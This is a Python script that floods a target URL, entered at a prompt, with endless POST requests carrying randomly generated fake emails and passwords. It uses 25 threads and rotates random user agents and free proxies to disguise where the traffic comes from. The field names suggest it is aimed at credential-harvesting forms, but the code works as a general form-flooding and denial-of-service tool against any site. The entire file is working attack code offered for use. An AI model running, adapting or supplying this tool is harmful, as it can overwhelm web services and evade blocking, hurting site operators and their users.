import threading
import requests
import random
from fp.fp import FreeProxy

from fake_useragent import UserAgent
from faker import Faker

# Fake information generator from many different languages to disguise requests
fake = Faker(['it_IT', 'en_US', 'ja_JP', 'fr_FR', 'de_DE', 'es_ES'])



def name_gen():#Generates a random name for the email
    return fake.user_name()

def generate_random_email():
    name = name_gen()
    NumberOrNo=random.choice(["Number", "No"])
    domain = random.choice(["@gmail.com", "@yahoo.com", "@rambler.ru", "@protonmail.com", "@outlook.com", "@itunes.com", "@hotmail.com", "@icloud.com"])#Popular email providers
    if NumberOrNo == "Number":
        return name + str(random.randint(1, 100)) + domain
    else:
        return name + domain

def generate_random_password():
    return fake.password() 

def generate_proxy():
    return FreeProxy(rand=True).get()

def send_posts(url):
    while True:
        email = generate_random_email()
        password = generate_random_password()
        data = {"a": email, "az": password}
        ua = UserAgent()
        user_agent = ua.random
        headers = {'User-Agent': user_agent}
        proxy = generate_proxy()
        response = requests.post(url, data=data, headers=headers, proxies={"http": proxy, "https": proxy})
        print(f"Email: {email}, Password: {password}, Status Code: {response.status_code}, headers: {user_agent}, proxy: {proxy}")

def main():
    url = input("Enter the URL of the target you want to flood: ")

    threads = [threading.Thread(target=send_posts, args=(url,), daemon=True) for _ in range(25)]

    for t in threads:
        t.start()

    for t in threads:
        t.join()

if __name__ == "__main__":
    main()
